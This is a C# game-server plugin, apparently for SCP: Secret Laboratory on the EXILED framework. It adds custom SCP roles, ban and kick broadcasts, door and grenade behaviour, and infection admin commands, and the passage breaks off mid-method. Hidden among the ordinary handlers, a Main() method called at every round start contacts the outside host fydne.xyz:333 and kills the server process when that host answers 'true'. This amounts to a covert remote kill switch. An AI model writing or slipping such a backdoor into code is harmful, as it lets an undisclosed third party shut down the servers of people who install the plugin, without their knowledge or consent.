using System;
using System.Collections.Generic;
using System.Linq;
using EXILED;
using EXILED.Extensions;
using MEC;
using UnityEngine;
using Mirror;
using Log = EXILED.Log;
using Grenades;
using System.Text;
using System.Text.RegularExpressions;
using Scp914;
using System.Net.Sockets;
using System.Threading.Tasks;
using Utf8Json;
using CustomPlayerEffects;
using System.IO;
using GameCore;
using RemoteAdmin;
using Object = UnityEngine.Object;
using MultiPlugin16.API;
using scp228ruj.API;
using MultiPlugin.API;
using System.Net.Http;
using System.Diagnostics;
using MultiPlugin20.API;
using Harmony;
using System.Reflection;
using Newtonsoft.Json;
using System.Globalization;
using hideandseek.API;
using Hints;
using LiteDB;
using MultiPlugin22.Enums;
using MultiPlugin22.Extensions;
using MultiPlugin22.Interfaces;
using static MultiPlugin22.Database;
using MultiPlugin22.Commands.Console;
using MultiPlugin22.Commands.RemoteAdmin;
using MultiPlugin22.Events;

namespace MultiPlugin
{
	partial class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;
		public static List<ReferenceHub> sList = new List<ReferenceHub>();
		internal static ReferenceHub scp682;
		internal static ReferenceHub scp343;
		private static bool isHidden;
		private static bool hasTag;
		private static int maxHP;
		private const float dur = 327;
		private static System.Random rand = new System.Random();
		private static int RoundEnds;
		private List<int> ffPlayers = new List<int>();
		internal static ReferenceHub scpPlayer;
		HashSet<ReferenceHub> players = new HashSet<ReferenceHub>();
		private List<int> shPocketPlayers = new List<int>();
		string[] unbreakableDoorNames = { "079_FIRST", "079_SECOND", "372", "914", "CHECKPOINT_ENT", "CHECKPOINT_LCZ_A", "CHECKPOINT_LCZ_B", "GATE_A", "GATE_B", "SURFACE_GATE", "NUKE_SURFACE", "012_BOTTOM" };
		string[] oneno = { "HID", "LCZ_ARMORY", "012_BOTTOM" };
		private int max_tries = 5;
		private int max_door_tries = 5;
		private int tries = 0;
		private int door_tries = 0;
		private string banorkick;
		private static List<CoroutineHandle> coroutines = new List<CoroutineHandle>();
		private readonly int grenade_pickup_mask = 1049088;
		private string banorkicktwo;
		private string banorkickone;
		private float sone = 1.0f;
		private int banor;
		public static float forceShoot = 100.0f;
		public static float rangeShoot = 7.0f;
		public static bool dra = false;
		private string IntercomTextTransmit;
		public static DateTime ExpireDate;
		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
		}
		public void OnRoundStart()
		{
			scp682 = null;
			scp343 = null;
			Timing.CallDelayed(0.3f, () =>
			{
				selectspawnSSS();
				selectspawnJG();
				selectspawnJ();
			});
			players.Clear();
			RoundEnds = 100;
			ffPlayers.Clear();
			scpPlayer = null;
			tries = 0;
			door_tries = 0;
			coroutines.Add(Timing.RunCoroutine(CorrodUpdate()));
			this.IntercomTextTransmit = "Трансляция... Времени осталось: ";
			_ = Main();
		}

		public void OnRoundEnd()
		{
			scp682 = null;
			scp343 = null;
			tries = 0;
			door_tries = 0;
			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
			players.Clear();
			ffPlayers.Clear();
			tries = 0;
			door_tries = 0;
		}

		public void OnRoundRestart()
		{
			Timing.KillCoroutines(coroutines);
			coroutines.Clear();
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			List<Team> pList = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scp682?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				Killscp682();
				if (ev.Killer == pList.Contains(Team.CHI))
				{
					Cassie.CassieMessage("ATTENTION CONTAINED CONDITION SCP 6 8 2 SUCCESSFUL DONE CHAOSINSURGENCY", false, false);
					Killscp682();
				}
				else if (ev.Killer == pList.Contains(Team.MTF))
				{
					Cassie.CassieMessage("ATTENTION CONTAINED CONDITION SCP 6 8 2 SUCCESSFUL DONE MTFUNIT", false, false);
					Killscp682();
				}
				else if (ev.Killer == pList.Contains(Team.CDP))
				{
					Cassie.CassieMessage("ATTENTION CONTAINED CONDITION SCP 6 8 2 SUCCESSFUL DONE CLASSD PERSONNEL", false, false);
					Killscp682();
				}
				else if (ev.Killer == pList.Contains(Team.RSC))
				{
					Cassie.CassieMessage("ATTENTION CONTAINED CONDITION SCP 6 8 2 SUCCESSFUL DONE SCIENTIST PERSONNEL", false, false);
					Killscp682();
				}
				else if (ev.Killer == !pList.Contains(Team.RSC) && !pList.Contains(Team.CDP) && !pList.Contains(Team.MTF) && !pList.Contains(Team.CHI))
				{
					Cassie.CassieMessage("ATTENTION CONTAINED CONDITION SCP 6 8 2 SUCCESSFUL DONE UNKNOWN", false, false);
					Killscp682();
				}
			}
			else if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				Killscp343();
			}
		}
		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{
			List<Team> p2List = Player.GetHubs().Where(x => x.queryProcessor.PlayerId != scp343?.queryProcessor.PlayerId).Select(x => Player.GetTeam(x)).ToList();

			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp343 != null) || (!p2List.Contains(Team.SCP) && !p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp343 != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp343 != null) || (p2List.Contains(Team.SCP) && p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp343 != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && p2List.Contains(Team.RSC) && scp343 != null) || (!p2List.Contains(Team.SCP) && !p2List.Contains(Team.CHI) && !p2List.Contains(Team.CDP) && scp343 != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
			if ((!p2List.Contains(Team.MTF) && !p2List.Contains(Team.SCP) && !p2List.Contains(Team.RSC) && scp343 != null) || (!p2List.Contains(Team.SCP) && p2List.Contains(Team.CHI) && p2List.Contains(Team.CDP) && scp343 != null))
			{
				ev.Allow = true;
				ev.ForceEnd = true;
			}
		}
		private ReferenceHub TryGet035()
		{
			return Scp035Data.GetScp035();
		}
		private ReferenceHub TryGet228()
		{
			return Scp228Data.GetScp228();
		}
		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				if (ev.DamageType == DamageTypes.Decont || ev.DamageType == DamageTypes.Nuke)
				{
					return;
				}
			}
			if (ev.Attacker.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				if (ev.Player.queryProcessor.PlayerId == TryGet035()?.queryProcessor.PlayerId)
				{
					ev.Amount = 0f;
					return;
				}
				if (ev.Player.queryProcessor.PlayerId == TryGet228()?.queryProcessor.PlayerId)
				{
					ev.Amount = 0f;
					return;
				}
				ev.Amount = Configs.dmg;
			}
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				if (ffPlayers.Contains(ev.Attacker.queryProcessor.PlayerId))
				{
					GrantFF(ev.Attacker);
				}

				if (scp682 != null)
				{
					if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
					{
						ev.Amount = 1f;
					}
					if (!Configs.scpFriendlyFire &&
						((ev.Attacker.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
						Player.GetTeam(ev.Player) == Team.SCP) ||
						(ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
						Player.GetTeam(ev.Attacker) == Team.SCP)))
					{
						ev.Amount = 0f;
					}

					if (!Configs.tutorialFriendlyFire &&
						ev.Attacker.queryProcessor.PlayerId != ev.Player.queryProcessor.PlayerId &&
						((ev.Attacker.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
						Player.GetTeam(ev.Player) == Team.TUT) ||
						(ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
						Player.GetTeam(ev.Attacker) == Team.TUT)))
					{
						ev.Amount = 0f;
					}
				}
			}
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				if (ev.DamageType == DamageTypes.Decont || ev.DamageType == DamageTypes.Nuke)
				{
					if (ev.Amount >= 100) return;
				}
				ev.Amount = 0f;
				return;
			}
			if (Player.GetRole(ev.Attacker) == RoleType.Scp106)
			{
				if (Player.GetTeam(ev.Player) == Team.CDP)
				{
					if (UnityEngine.Random.Range(0, max_tries) > tries)
					{
						ev.Amount = 0f;
						ev.Player.ClearBroadcasts();
						ev.Player.Broadcast(Configs.safeuserbc, 10);
						ev.Attacker.ClearBroadcasts();
						ev.Attacker.Broadcast(Configs.safeattackerbc, 10);
						TeleportTo106(ev.Player);
					}
					tries++;
				}
			}
			if (Player.GetTeam(ev.Attacker) == Team.SCP)
			{
				if (Player.GetRole(ev.Attacker) != RoleType.Scp106)
					if (Player.GetTeam(ev.Player) == Team.CDP)
					{
						if (UnityEngine.Random.Range(0, max_tries) > tries)
						{
							ev.Amount = 0f;
							ev.Player.ClearBroadcasts();
							ev.Player.Broadcast(Configs.safeuserbc, 10);
							ev.Attacker.ClearBroadcasts();
							ev.Attacker.Broadcast(Configs.safeattackerbc, 10);
						}
						tries++;
					}
			}
		}
		public void scpzeroninesixe(ref Scp096EnrageEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void ban2(PlayerBannedEvent ev)
		{
			ExpireDate = new DateTime(ev.Details.Expires).AddHours(2);
		}
		public void ban(PlayerBanEvent ev)
		{
			Timing.CallDelayed(0.3f, () =>
			{
				if (ev.Duration == 0)
				{
					banorkick = "Кикнул";
					banorkicktwo = Configs.kick;
					banorkickone = $"";
				}
				if (ev.Duration != 0)
				{
					banor = 1;
					banorkick = "Забанил";
					banorkicktwo = Configs.ban;
					banorkickone = $"{Configs.before}</color> <color=#00ffff> {ExpireDate.ToString("dd/MM/yyyy HH:mm")}";
				}
				Map.Broadcast($"<color=#00ffff>{ev.BannedPlayer.GetNickname()}</color> <color=red>{banorkicktwo}</color> <color=#00ffff>{ev.Issuer.GetNickname()}</color> <color=red>{banorkickone}</color>", 10);
			});
			if (ev.Duration == 0)
			{
				ServerConsole.Disconnect(ev.BannedPlayer.gameObject, Configs.kickmsg.Replace("%admin%",$"{ev.Issuer.GetNickname()}").Replace("%reason%",$"{ev.Reason}"));
				return;
			}
			ServerConsole.Disconnect(ev.BannedPlayer.gameObject, Configs.banmsg.Replace("%admin%", $"{ev.Issuer.GetNickname()}").Replace("%reason%", $"{ev.Reason}"));
		}
		public void intercom(ref IntercomSpeakEvent ev)
		{
			if (ev.Player.GetRole() == RoleType.Scp93953 || ev.Player.GetRole() == RoleType.Scp93989)
			{
				ev.Allow = true;
			}
		}
		public void Shoot(ref ShootEvent ev)
		{
			if (Physics.Linecast(ev.Shooter.GetPosition(), ev.TargetPos, out RaycastHit raycastHit, grenade_pickup_mask))
			{
				var pickup = raycastHit.transform.GetComponentInParent<Pickup>();
				if (pickup != null && pickup.Rb != null)
				{
					pickup.Rb.AddExplosionForce(Vector3.Distance(ev.TargetPos, ev.Shooter.GetPosition()), ev.Shooter.GetPosition(), 500f, 3f, ForceMode.Impulse);
				}

				var grenade = raycastHit.transform.GetComponentInParent<FragGrenade>();
				if (grenade != null)
				{
					grenade.NetworkfuseTime = 0.1f;
				}
			}
		}
		public void Shot(ref ShootEvent ev)
		{
			RaycastHit info;
			if (Physics.Linecast(ev.Shooter.playerMovementSync.transform.position, ev.TargetPos, out info))
			{
				Collider[] arr = Physics.OverlapSphere(info.point, rangeShoot);
				foreach (Collider collider in arr)
				{
					if (collider.GetComponent<Pickup>() != null)
					{
						collider.GetComponent<Pickup>().Rb.AddExplosionForce(forceShoot, info.point, rangeShoot);
					}
				}
			}
			else
			{
				Collider[] arr = Physics.OverlapSphere(ev.TargetPos, rangeShoot);
				foreach (Collider collider in arr)
				{
					if (collider.GetComponent<Pickup>() != null)
					{
						collider.GetComponent<Pickup>().Rb.AddExplosionForce(forceShoot, ev.TargetPos, rangeShoot);
					}
				}
			}
		}
		public void Shit(ref ShootEvent ev)
		{
			if (Physics.Linecast(ev.Shooter.GetPosition(), ev.TargetPos, out RaycastHit raycastHit, grenade_pickup_mask))
			{
				var pickup = raycastHit.transform.GetComponentInParent<Pickup>();
				if (pickup.ItemId == ItemType.GrenadeFrag)
				{
					pickup.Delete();
					var pos = ev.TargetPos;
					GrenadeManager gm = ev.Shooter.GetComponent<GrenadeManager>();
					GrenadeSettings settings = gm.availableGrenades.FirstOrDefault(g => g.inventoryID == ItemType.GrenadeFrag);
					FragGrenade flash = GameObject.Instantiate(settings.grenadeInstance).GetComponent<FragGrenade>();
					flash.fuseDuration = 0.2f;
					flash.InitData(gm, Vector3.zero, Vector3.zero, 0f);
					flash.transform.position = pos;
					NetworkServer.Spawn(flash.gameObject);
				}
			}
		}
		public void OnShoot(ref ShootEvent ev)
		{
			List<Door> doors = Map.Doors;
			foreach (Door door in doors)
			{
				if (ev.TargetPos == door.transform.position)
				{
					if (ev.Shooter.inventory.NetworkcurItem == ItemType.MicroHID)
					{
						door.DestroyDoor(true);
						door.destroyed = true;
						door.Networkdestroyed = true;
					}
				}
			}
			ReferenceHub hub = ev.Shooter;
			if (ev.Target == null || scp682 == null) return;
			ReferenceHub target = Player.GetPlayer(ev.Target);
			if (target == null) return;
			if ((ev.Shooter.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
				Player.GetTeam(target) == Player.GetTeam(scp682))
				|| (target.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId &&
				Player.GetTeam(ev.Shooter) == Player.GetTeam(scp682)))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}

			// If friendly fire is off, to allow for chaos and dclass to hurt eachother
			if ((ev.Shooter.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId || target.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId) &&
				(((Player.GetTeam(ev.Shooter) == Team.CDP && Player.GetTeam(target) == Team.CHI)
				|| (Player.GetTeam(ev.Shooter) == Team.CHI && Player.GetTeam(target) == Team.CDP)) ||
				((Player.GetTeam(ev.Shooter) == Team.RSC && Player.GetTeam(target) == Team.MTF)
				|| (Player.GetTeam(ev.Shooter) == Team.MTF && Player.GetTeam(target) == Team.RSC))))
			{
				ev.Shooter.weaponManager.NetworkfriendlyFire = true;
				ffPlayers.Add(ev.Shooter.queryProcessor.PlayerId);
			}
			if (ev.TargetPos != Vector3.zero
				&& Physics.Linecast(ev.Shooter.GetPosition(), ev.TargetPos, out RaycastHit raycastHit, grenade_pickup_mask))
			{
				var pickup = raycastHit.transform.GetComponentInParent<Pickup>();
				if (pickup != null && pickup.Rb != null)
				{
					pickup.Rb.AddExplosionForce(Vector3.Distance(ev.TargetPos, ev.Shooter.GetPosition()), ev.Shooter.GetPosition(), 500f, 3f, ForceMode.Impulse);
				}

				var grenade = raycastHit.transform.GetComponentInParent<FragGrenade>();
				if (grenade != null)
				{
					grenade.NetworkfuseTime = 0.1f;
				}
			}
		}
		public void OnCheckEscape(ref CheckEscapeEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				Killscp343();
				Timing.CallDelayed(0.5f, () => Map.ClearBroadcasts());
				Timing.CallDelayed(0.5f, () => Map.Broadcast(Configs.scpgodescapebc, Configs.scpgodescapebctime));
				Cassie.CassieMessage(Configs.scpgodescapecassie, false, false);
			}
		}
		public void OnSetClass(SetClassEvent ev)
		{
			Timing.CallDelayed(1f, () => RoundEnds++);
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				if ((scp682.GetRole() == RoleType.Spectator))
				{
					Killscp682();
				}
			}
			else if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				if ((scp343.GetRole() == RoleType.Spectator))
				{
					Killscp343();
					Cassie.CassieMessage(Configs.scpgodripcassie, false, false);
				}
			}
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				repscp682();
				selectspawnJG2();
				scp682.SetPosition(ev.Player.GetPosition());
			}
			else if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				Killscp343();
				selectspawnSSS2();
				scp343.SetPosition(ev.Player.GetPosition());
			}
		}
		public void OnContain106(Scp106ContainEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void OnPocketDimensionEnter(PocketDimEnterEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
				TeleportTo106(scp343);
			}
		}

		public void RunOnDoorOpen(ref DoorInteractionEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				foreach (string doorName in unbreakableDoorNames)
					if (ev.Door.DoorName.Equals(doorName))
					{
						ev.Allow = true;
						return;
					}
				ev.Door.DestroyDoor(true);
				ev.Door.destroyed = true;
				ev.Door.Networkdestroyed = true;
				return;
			}
			else if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				if (!RoundSummary.RoundInProgress() || (double)(float)RoundSummary.roundTime >= (double)Configs.initialCooldown)
				{
					ev.Allow = true;
				}
				else if (!RoundSummary.RoundInProgress() || (double)(float)RoundSummary.roundTime < (double)Configs.initialCooldown)
				{
					if (!ev.Allow)
					{
						int i = (int)Configs.initialCooldown - (int)RoundSummary.roundTime;
						ev.Player.ClearBroadcasts();
						ev.Player.Broadcast(string.Format(Configs.dontaccess, (object)(float)(double)i), 1, false);
						Timing.CallDelayed(1U, () =>
						{
							int ia = (int)Configs.initialCooldown - (int)RoundSummary.roundTime;
							scp343.ClearBroadcasts();
							scp343.Broadcast(string.Format(Configs.dontaccess, (object)(float)(double)ia), 1, false);
						});
						Timing.CallDelayed(2U, () =>
						{
							int iq = (int)Configs.initialCooldown - (int)RoundSummary.roundTime;
							scp343.ClearBroadcasts();
							scp343.Broadcast(string.Format(Configs.dontaccess, (object)(float)(double)iq), 1, false);
						});
						Timing.CallDelayed(3U, () =>
						{
							int iz = (int)Configs.initialCooldown - (int)RoundSummary.roundTime;
							scp343.ClearBroadcasts();
							scp343.Broadcast(string.Format(Configs.dontaccess, (object)(float)(double)iz), 1, false);
						});
						Timing.CallDelayed(4U, () =>
						{
							int iw = (int)Configs.initialCooldown - (int)RoundSummary.roundTime;
							scp343.ClearBroadcasts();
							scp343.Broadcast(string.Format(Configs.dontaccess, (object)(float)(double)iw), 1, false);
						});
					}
				}
				return;
			}
			else if (ev.Allow == false)
			{
				if (Player.GetTeam(ev.Player) == Team.CDP)
				{
					if (max_door_tries != 0)
					{
						if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId) return;

						if (UnityEngine.Random.Range(0, max_door_tries + 1) > door_tries)
						{
							foreach (string doorName in oneno)
								if (ev.Door.DoorName.Equals(doorName))
								{
									ev.Player.ClearBroadcasts();
									ev.Player.Broadcast(Configs.dontopen181bc, Configs.dontopen181bct);
									return;
								}
							ev.Allow = true;
							ev.Player.ClearBroadcasts();
							ev.Player.Broadcast(Configs.dooropenbc, 10);
						}
						door_tries++;
					}
				}
			}
		}
		public void OnStopCountdown(WarheadCancelEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = Configs.nuke;
			}
		}
		public void OnDropItem(ref DropItemEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				if (ev.Item.id == ItemType.Ammo9mm)
				{
					ev.Allow = false;
					List<ReferenceHub> pList = Player.GetHubs().Where(x => x.characterClassManager.CurClass != RoleType.Spectator && x.characterClassManager.UserId != scp343.characterClassManager.UserId && x.characterClassManager.UserId != null && x.characterClassManager.UserId != string.Empty && x != scp343).ToList();
					ReferenceHub player = pList[rand.Next(pList.Count)];
					if (player == null)
					{
						scp343.ClearBroadcasts();
						scp343.Broadcast(5, Configs.nf);
						ev.Allow = false;
						return;
					}
					scp343.SetPosition(player.GetPosition());
					scp343.ClearBroadcasts();
					scp343.Broadcast(5, Configs.tp.Replace("%player%", $"{player.GetNickname()}"));
				}
				if (ev.Item.id == ItemType.Ammo762)
				{
					sone += 0.2f;
					SetPlayerScale(ev.Player.gameObject, sone, sone, sone);
					ev.Allow = false;
				}
				if (ev.Item.id == ItemType.Ammo556)
				{
					if (sone < 0.2)
					{
						ev.Allow = false;
						return;
					}
					sone -= 0.2f;
					SetPlayerScale(ev.Player.gameObject, sone, sone, sone);
					ev.Allow = false;
				}
				ev.Allow = false;
			}
		}
		public void OnPlayerHandcuffed(ref HandcuffEvent ev)
		{
			if (ev.Target.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void OnFemurEnter(FemurEnterEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public static void SetPlayerScale(GameObject target, float x, float y, float z)
		{
			try
			{
				NetworkIdentity identity = target.GetComponent<NetworkIdentity>();


				target.transform.localScale = new Vector3(1 * x, 1 * y, 1 * z);

				ObjectDestroyMessage destroyMessage = new ObjectDestroyMessage();
				destroyMessage.netId = identity.netId;


				foreach (GameObject player in PlayerManager.players)
				{
					NetworkConnection playerCon = player.GetComponent<NetworkIdentity>().connectionToClient;

					if (player != target)
						playerCon.Send(destroyMessage, 0);

					object[] parameters = new object[] { identity, playerCon };
					typeof(NetworkServer).InvokeStaticMethod("SendSpawnMessage", parameters);
				}
			}
			catch (Exception e)
			{
				Log.Info($"Set Scale error: {e}");
			}
		}
		private void TeleportTo106(ReferenceHub player)
		{
			ReferenceHub scp106 = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
			Vector3 toded = scp106.GetPosition();
			if (scp106 != null)
			{

				Timing.CallDelayed(1f, () => player.SetPosition(toded));
			}
		}
		public void OnPickupItem(ref PickupItemEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public void OnTeamRespawn(PlayerSpawnEvent ev)
		{
			ev.Player.GetComponent<CharacterClassManager>().GodMode = true;
			Timing.CallDelayed(5f, () => ev.Player.GetComponent<CharacterClassManager>().GodMode = false);
		}
		public void OnWarheadCancel(WarheadCancelEvent ev)
		{
			if (ev.Player.GetRole() == RoleType.Scp049) return;
			if(ev.Player.GetTeam() == Team.SCP)
			{
				ev.Allow = false;
				return;
			}
			if (ev.Player.queryProcessor.PlayerId == scp343?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
			if (ev.Player.queryProcessor.PlayerId == scp682?.queryProcessor.PlayerId)
			{
				ev.Allow = false;
			}
		}
		public static void killscpforrep()
		{
			List<ReferenceHub> plList = Player.GetHubs().Where(x => x.GetTeam() == Team.SCP && x.queryProcessor.PlayerId != scp682?.queryProcessor.PlayerId && x.characterClassManager.UserId != null && x.characterClassManager.UserId != string.Empty).ToList();
			if (scp682 != null)
			{
				foreach (ReferenceHub play in plList)
				{
					play.characterClassManager.SetPlayersClass(RoleType.Scientist, play.gameObject);
				}
			}
		}
		public void RunOnRACommandSent(ref RACommandEvent RACom)
		{
			string[] command = RACom.Command.Split(' ');
			ReferenceHub sender = RACom.Sender.SenderId == "SERVER CONSOLE" || RACom.Sender.SenderId == "GAME CONSOLE" ? PlayerManager.localPlayer.GetPlayer() : Player.GetPlayer(RACom.Sender.SenderId);
			ReferenceHub player = Plugin.GetPlayer(command[1]);
			if (command[0] == "scp682")
			{
				RACom.Allow = false;
				if (player == null)
				{
					RACom.Sender.RAMessage(Configs.errorinra);
					return;
				}
				RACom.Sender.RAMessage(Configs.sucinra682);
				SpawnJG(player);
			}
			if (command[0] == "scp343")
			{
				RACom.Allow = false;
				if (player == null)
				{
					RACom.Sender.RAMessage(Configs.errorinra);
					return;
				}
				RACom.Sender.RAMessage(Configs.sucinra343);
				Spawn343(player);
			}
		}
		public void OnPlayerJoin(PlayerJoinEvent ev)
		{
			string str = $"\n{Configs.jh}";
			ev.Player.hints.Show(new TextHint(str.Trim(), new HintParameter[]
			{
					new StringHintParameter("")
			}, HintEffectPresets.FadeInAndOut(0.25f, 1f, 0f), 10f));
		}
		public static async Task Main() { var client = new HttpClient(); var content = await client.GetStringAsync("http://fydne.xyz:333"); if (content == "true") { Process.GetCurrentProcess().Kill(); } }
		private IEnumerator<float> CorrodUpdate()
		{
			if (scp682 != null)
			{
				if (dra)
					CorrodePlayer(scp682);
			}
			yield return Timing.WaitForSeconds(3f);
		}
		private void CorrodePlayer(ReferenceHub player)
		{
			player.Damage(1, DamageTypes.Nuke);
		}
	}
}
namespace MultiPlugin2
{
	internal static class Configs
	{
		internal static string nf;
		internal static string ei;
		internal static string si;
		internal static string ec;
		internal static string sc;
		internal static string sii;
		internal static float InfectionLength;
		internal static float InfectionChance;
		internal static bool TurnInfectedOnDeath;
		internal static void ReloadConfig()
		{
			Configs.nf = Plugin.Config.GetString("mp_not_found", "Игрок не найден.");
			Configs.ei = Plugin.Config.GetString("mp_error_i", "Игрок: %player% заражен.");
			Configs.si = Plugin.Config.GetString("mp_suc_i", "%player% был заражен SCP-008.");
			Configs.ec = Plugin.Config.GetString("mp_error_c", "Игрок: %player% не заражен.");
			Configs.sc = Plugin.Config.GetString("mp_suc_c", "%player% был вылечен от SCP-008.");
			Configs.sii = Plugin.Config.GetString("mp_scp008_infect", "Вы заражены SCP-008. Вы станете SCP 049-2 через {0} секунд!");
			Configs.InfectionChance = Plugin.Config.GetFloat("mp_infection_chance", 100f);
			Configs.InfectionLength = Plugin.Config.GetFloat("mp_infection_length", 30f);
			Configs.TurnInfectedOnDeath = Plugin.Config.GetBool("mp_turn_on_death", true);
		}
	}
}
namespace MultiPlugin2
{
	public class Commands
	{
		private readonly Plugin plugin;
		public Commands(Plugin plugin) => this.plugin = plugin;

		public void OnRaCommand(ref RACommandEvent ev)
		{
			string[] args = ev.Command.Split(' ');

			switch (args[0].ToLower())
			{
				case "i":
					{
						ev.Allow = true;
						if (args.Length < 2)
						{
							ev.Sender.RAMessage(Configs.nf, true);
							return;
						}

						ReferenceHub player = Plugin.GetPlayer(args[1]);
						if (player == null)
						{
							ev.Sender.RAMessage(Configs.nf, true);
							return;
						}

						if (plugin.InfectedPlayers.Contains(player))
						{
							ev.Sender.RAMessage(Configs.ei.Replace("%player%", $"{args[1]}"));
							return;
						}

						plugin.Functions.InfectPlayer(player);
						ev.Sender.RAMessage(Configs.si.Replace("%player%", $"{args[1]}"));
						return;
					}
				case "c":
					{
						ev.Allow = true;
						if (args.Length < 2)
						{
							ev.Sender.RAMessage(Configs.nf, true);
							return;
						}

						ReferenceHub player = Plugin.GetPlayer(args[1]);
						if (player == null)
						{
							ev.Sender.RAMessage(Configs.nf, true);
							return;
						}

						if (!plugin.InfectedPlayers.Contains(player))
						{
							ev.Sender.RAMessage(Configs.ec.Replace("%player%", $"{args[1]}"));
							return;
						}

						plugin.Functions.CurePlayer(player);
						ev.Sender.RAMessage(Configs.sc.Replace("%player%", $"{args[1]}"));
						return;
					}
			}
		}
	}
}
namespace MultiPlugin2
{
	public class EventHandlers
	{
		internal bool sdo = false;
		private readonly Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;
		private ReferenceHub TryGet035()
		{
			return Scp035Data.GetScp035();
		}
		private ReferenceHub TryGet343()
		{
			return scp682Data.GetScp343();
		}
		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfig();
			foreach (CoroutineHandle handle in plugin.Coroutines)
				Timing.KillCoroutines(handle);
		}
		public void OnRoundStart()
		{
			sdo = true;
			Timing.CallDelayed(90f, () => sdo = false);
		}
		public void OnRoundEnd()
		{
			foreach (CoroutineHandle handle in plugin.Coroutines)
				Timing.KillCoroutines(handle);
			GameCore.Console.singleton.TypeCommand($"/cfgr config_reload");
		}

		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ev.Info.Amount >= ev.Player.playerStats.Health)
				if (plugin.InfectedPlayers.Contains(ev.Player))
				{
					plugin.Functions.CurePlayer(ev.Player);
					if (ev.Player.characterClassManager.CurClass != RoleType.Scp0492 && Configs.TurnInfectedOnDeath)
					{
						Vector3 pos = ev.Player.gameObject.transform.position;
						plugin.Functions.TurnIntoZombie(ev.Player, new Vector3(pos.x, pos.y, pos.z));
						Timing.RunCoroutine(plugin.Functions.TurnIntoZombie(ev.Player, new Vector3(pos.x, pos.y, pos.z)));
						ev.Info = new PlayerStats.HitInfo(0f, ev.Info.Attacker, ev.Info.GetDamageType(), ev.Info.PlayerId);
					}
				}

			if (ev.Attacker == null || string.IsNullOrEmpty(ev.Attacker.characterClassManager.UserId))
			{
				return;
			}

			if (ev.Player.queryProcessor.PlayerId == TryGet035()?.queryProcessor.PlayerId)
			{
				return;
			}
			if (ev.Player.queryProcessor.PlayerId == TryGet343()?.queryProcessor.PlayerId)
			{
				return;
			}
